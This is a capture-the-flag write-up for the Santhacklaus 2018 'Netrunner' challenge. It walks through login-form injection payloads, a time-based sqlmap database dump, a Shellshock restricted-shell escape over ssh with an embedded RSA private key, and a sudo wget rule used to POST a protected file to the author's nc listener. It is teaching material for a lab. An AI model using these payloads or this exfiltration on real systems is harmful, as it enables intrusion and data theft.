+++
categories = ["Writeups", "CTF", "Santhacklaus-2018", "Web", "System"]
date = "2018-12-30"
title = "Netrunner"
subtitle = "V, I got a mission for you !"
thumbnail = "/img/santhacklaus/logo.png"
nopaging = "true"
+++

Netrunner is the second biggest challenge of the Santhacklaus 2018 CTF. The challenge is not really hard, but could be particulary annoying if you don't know what to do. You need to have some skills in pentest web and medium skills in Linux system.

The challenge is divided in 3 steps. Each step has its own validation password (flag). So let's begin with the first step ! 

![](/img/santhacklaus/netrunner1.png "")




## 1st step - You have a mission !

![](/img/santhacklaus/netrunner2.png "")

Well received ! Mission accepted, let's save the world !
Fire your favorite web browser and navigate to http://santhacklaus.xyz:2077/

![](/img/santhacklaus/netrunner3.png "")


Humm authentication page. Let's inspect that.

{{< protips "When you do web pentesting, you must have a proxy who intercept request to inspect and replay it. I recommend you to use Burp with the browser extension FoxyProxy to switch rapidly between all yours proxys." >}}

So open Burp to do traffic interception. Submit something in the form and send the request to repeater section in Burp.

![](/img/santhacklaus/netrunner4.png "")

Ok that's better ! So what can we see ?

- The form send credentials to `/zetatech-admin.php` for checking.
- Server is running Nginx web server
- Http bruteforce is forbidden. Then, there is probably no others pages. You have to find a vulnerability on this page.

Ok but what am I supposed to do now ? Take a breath and read the OWASP Testing Guide : https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet

Here some work with most famous injection : 

- Test for LDAP Injection : https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)
- Test for NoSQL injection : https://www.owasp.org/index.php/Testing_for_NoSQL_injection
- Test for XPath Injection : https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)
- Test for SQL Injection : https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)

### Test for LDAP Injection

First, try if the application is vulerable to LDAP injection with the help of owasp guide
If an application uses LDAP in its user authentication process, and is vulnerable to LDAP injection, it can be bypassed by injecting an LDAP query that will always be true (similar to SQL and XPATH injections).

Let's assume that a web application uses a filter to do the LDAP user / password mapping.

`searchlogin = "(&(USER = " + user_name + ") (PASSWORD = " + user_password + "))";`

Using the following values:

```
user = johnDoe)(&)
pass = password
```
The search filter becomes:

`searchlogin = "(&(USER = johnDoe)(&))(PASSWORD = pass))"`

Only the first portion of this query is processed by the LDAP server `(&(USER = johnDoe)(&)` which always evaluates to true allowing the attacker to gain access to the system without needing to provide valid user credentials.

Thanks wikipédia ! Let's try this. Here is an example of what you can try.

![](/img/santhacklaus/netrunner5.png "")

Humm not seem effective. Let's try an other injection.


### Test for NoSQL Injection

NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits.

It's really easy to detect. Look at the query below. The `[$ne]` string mean not equal. So the query mean : **_username not equal to th1b4ud and password not equal to p4sSw0rD_**. So the query will return true.

`username[$ne]=th1b4ud&password[$ne]=p4sSw0rD`

Test this !

![](/img/santhacklaus/netrunner7.png "")

Sad :(

### Test for XPath 

XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. The exploitation is Similar to SQL.


An XPath query that returns the account whose username is `th1b4ud` and the password is `p4sSw0rD` would be the following:

`string(//user[username/text()='th1b4ud' and password/text()='p4sSw0rD']/account/text()) `

If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:

```
Username: ' or '1' = '1 
Password: ' or '1' = '1 
```

Looks quite familiar, doesn't it? Using these parameters, the query becomes:

`string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) `

As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided.

So let's try this !

![](/img/santhacklaus/netrunner6.png "")

Humm, maybe it's not XPath behind.

### Test for SQL Injection

An SQL injection attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. Maybe it will work (I hope !!!)

Consider the following SQL query:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. 

```
$username = 1' or '1' = '1
$password = 1' or '1' = '1
```

The query will be:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' `

But remember ! We already test this payload with XPath injection. We need to go deeper !

{{< protips "When you are searching sql injection entry point always use sleep functionnality" >}}

Look at my last protips. I speak about `SLEEP()` function to detect entry point. The function `SLEEP()` (in mysql and in others database engine) permit to stop the server for a while. We will exploit this functionnality to detect if an entry is vulnerable. The application run with php. I hope the database engine is MySql or an other engine who support `SLEEP()` function. We shall see !

These query should do the trick :

```md
username=th1b4ud&password=password' OR SLEEP(3)#&login=Login
username=th1b4ud' OR SLEEP(3)#&password=password&login=Login
```

![](/img/santhacklaus/netrunner1.gif "")

![](https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif "")

HOHO ! We found something ! We've got a sql injection vulnerability in the username ! Nice ! It's time to confirm that there is a mysql database behind the application.

{{< protips "You start to know me, I love to use cheatsheet. This on is nice to explore sql injection : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection" >}}

![](/img/santhacklaus/netrunner2.gif "")

Nice this is MySql. So I imagine the php code behind will do advanced check to avoid to pass throught with `' OR 1=1#` injection. But I think it's the good moment to show you how to use Sqlmap with time based sql injection.

This article speak well about time based injection : http://www.sqlinjection.net/time-based/

{{< danger "Sqlmap is a real dangerous tool for weak application. You can easily DOS it with a --risk and --level too high. Set a delay in your command argument (ex : --delay 5 -> 5s of delay between each request) when you are not sure." >}}

So what do we have to set to Sqlmap :

- **Url (`-u`)** : `"http://51.75.202.113:2077/zetatech-admin.php"`
- **Http query (`--data`)** : `"username=test&password=test&login=Login"`
- **Vulnerable field (`-p`)** : `"username"`
- **HTTP method (`--method`)** : `POST`
- **SQL Injection technique (`--technique`)** : `T` for Time-Based
- **Level agressivity (`--level`)** : `5` maximum (sorry for the DOS :$)
- **Dangerousness for database integrity (`--risk`)** : `2` (3 is the maximum and can lead to an update of all the entries of the table)
- **Database engine (`--dbms`)** : `mysql`
- **Action to perform** : dump the database with `--dump`

```
[th1b4ud@th1b4ud-pc ~]$ sqlmap -u "http://51.75.202.113:2077/zetatech-admin.php" --data "username=test&password=test&login=Login" -p "username" --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:35:34

---
Parameter: username (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: username=test'||(SELECT 0x74657745 FROM DUAL WHERE 4732=4732 AND SLEEP(5))||'&password=test&login=Login
---

[...]

Database: ctf-zetatech-inc
Table: access
[2 entries]
+----+---------------+------------------------------------------------------------------+
| id | user          | password                                                         |
+----+---------------+------------------------------------------------------------------+
| 1  | admin         | e6c2d84527c9f0af9b6d6fe33fd987b6ef47360e335e71220201e72c4ac5ccf9 |
| 2  | puppet-master | 31e2d9e7ee8279341dee46986670996145a699937616fd03fe362426b5b47c25 |
+----+---------------+------------------------------------------------------------------+

[15:15:35] [INFO] table '`ctf-zetatech-inc`.access' dumped to CSV file '/home/th1b4ud/.sqlmap/output/51.75.202.113/dump/ctf-zetatech-inc/access.csv'
[15:15:35] [INFO] fetched data logged to text files under '/home/th1b4ud/.sqlmap/output/51.75.202.113'

[*] shutting down at 15:15:35
```

Ho finally ! We dump the database ! We've got two users : `admin` and `puppet-master`. Let's try a very simple injection with these informations.

```
admin'#
puppet-master'#
```

With admin

![](/img/santhacklaus/netrunner8.png "")

Sad :(

![](/img/santhacklaus/netrunner9.png "")

![](https://media.giphy.com/media/3o6UB3VhArvomJHtdK/giphy.gif)

OMG IT WORKS !



## 2nd step - Bypass protection

![](/img/santhacklaus/netrunner10.png "")

We've got an access to the application. We now have an access to this page : http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html

There is a private key.

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Why not try a ssh connexion with the username `puppet-master` on the port `2021` (see description)

```
[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.


████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████


----------------------------- General Informations -----------------------------

Software Version     ::: 10.5.2546_b1 [OBSOLETE]
Client ID            ::: 1534D 4245 97554 P

General health       ::: [ALIVE]

Management interface ::: [ONLINE]
Maintenance link     ::: [ONLINE]



----------------------- Installed Cybernetic Prosthetics -----------------------

Zetatech Neural Processor MK.II   ::: [CONNECTION ERROR]
Zetatech Enforcement 10.A Sidearm ::: [NOT CONNECTED]
Zetatech Binoculars BT.4          ::: [NOT CONNECTED]


Connection to 51.75.202.113 closed.
```

Ho ! Connection closed ! Maybe we have to bypass a restricted shell or a similar protection.
Lets type the question to Google : `escape restricted shell` and click on the first link : https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells

Look at the ninth slide : 

```bash
# Use SSH on your machine to execute commands before the remote shell is loaded
ssh restricted@10.20.30.40 -t "/bin/sh"

# Or start the remote shell without loading "rc" profile (where most of the limitations are often configured)
ssh restricted@10.20.30.40 -t "bash --noprofile"

# Try ShellShock on vulnerable shell implementations
ssh restricted@10.20.30.40 -t "() { :; }; /bin/bash"
```

Let's try this 3 commands

```
[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "/bin/sh"

[...]

Connection to 51.75.202.113 closed.
```

No

```
[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "bash --noprofile"

[...]

Connection to 51.75.202.113 closed.
```

No

```
[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "() { :; }; /bin/bash"
.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
puppet-master@2a87f3ade358:~$ 
```

WUT ? O.O

![](https://media.giphy.com/media/aWPGuTlDqq2yc/giphy.gif)


Stop, stop, stop ! Shellshock ?!? Really ?!?

```bash
puppet-master@2a87f3ade358:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
vulnerable
this is a test
```

Ok... Shellshock \o/

What is Shellshock ?

`Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.`

Thank you Wikipedia. There is many articles on Internet who will do a better explanation than me, in particular this one : https://fedoramagazine.org/shellshock-how-does-it-actually-work/

And what is `-t` argument in ssh ?

```
-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote
        machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty
        allocation, even if ssh has no local tty.
```

With `-t` argument you can execute arbitrary programs on the server. Perfect for us ! The host is vulnerable to shellshock, so we can abuse this ssh feature to exploit the Shellshock vulnerability to obtain a shell \o/

```
puppet-master@2a87f3ade358:~$ cat client.note 

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Client Note ::::

You can access to your web interface to have more informations.
You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
If you have any issues with Zetatech products, please contact us.

Note: the password is the same than your username.

:: IMTLD{Pr0t3ct_Y0uR_Gh0sT}
```

Go to the next and last step !



## 3rd step - Nice exfiltration !

![](/img/santhacklaus/netrunner11.png "")

Look at the file `client.note`. It say : `Note: the password is the same than your username.`
Why is necessary to know the user password ? To be able to execute sudo !!!


```
puppet-master@2a87f3ade358:~$ sudo -l
[sudo] password for puppet-master: 
Matching Defaults entries for puppet-master on 2a87f3ade358:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, lecture=never

User puppet-master may run the following commands on 2a87f3ade358:
    (puppet-master : zetatech-maintenance) /usr/bin/wget
```

Yeah ! The exploit is here ! What can we do ? User `puppet-master` can execute wget with group permission of `zetatech-maintenance`. Good ! Look at the `puppet-master` home

```
puppet-master@2a87f3ade358:~$ ls -al
total 36
dr-xr-x--- 1 root puppet-master        4096 Dec 16 13:30 .
drwxr-xr-x 1 root root                 4096 Dec 11 08:01 ..
-r-xr-x--- 1 root puppet-master         220 Dec 11 08:01 .bash_logout
-r-xr-x--- 1 root puppet-master        3392 Dec 11 08:01 .bashrc
-r-xr-x--- 1 root puppet-master         675 Dec 11 08:01 .profile
drwxr-x--- 1 root puppet-master        4096 Dec 11 08:01 .ssh
-rwxr----- 1 root puppet-master         439 Dec 10 13:52 client.note
-rwxr-x--- 1 root puppet-master         746 Dec 10 13:52 status.sh
-rwxr----- 1 root zetatech-maintenance  266 Dec 10 13:52 tech.note
```

The file `tech.note` can be read by group `zetatech-maintenance`. This is the file we need ! Let's exfiltrate it !

First, launch my listener.

```
th1b4ud@pc-th1b4ud:~$ nc -lvp 4444
listening on [any] 4444 ...
```

But before go further, what is `wget` ?

`GNU Wget (or just Wget, formerly Geturl, also written as its package name, wget) is a computer program that retrieves content from web servers. It is part of the GNU Project. Its name derives from World Wide Web and get. It supports downloading via HTTP, HTTPS, and FTP. `

Thanks again Wikipedia \o/

So we can download file with `wget`. Can you upload/send some file too ? The answer is yes ! Look at the man.

```
 --post-data=string
 --post-file=file
      Use POST as the method for all HTTP requests and send the specified data in the request body.  --post-data
      sends string as data, whereas --post-file sends the contents of file.
```

This is the option we need ! Let's execute `wget` with `zetatech-maintenance` group permission.

```
sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
```

Ho ! Something appeared on the listener !

```bash
connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 58604
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 79.85.186.254:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 266


.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Admin Note ::::

Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.

:: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
```

## Conclusion

So what do we learned with this challenge ?

- Learn how to test an authentication form.
- Learn to use CAREFULLY Sqlmap to dump database’s content.
- Exploit Shellshock vulnerability to bypass restricted bash.
- Exploit sudo misconfiguration.

Thanks again to the Santhacklaus CTF Team for all their challenges !

Th1b4ud

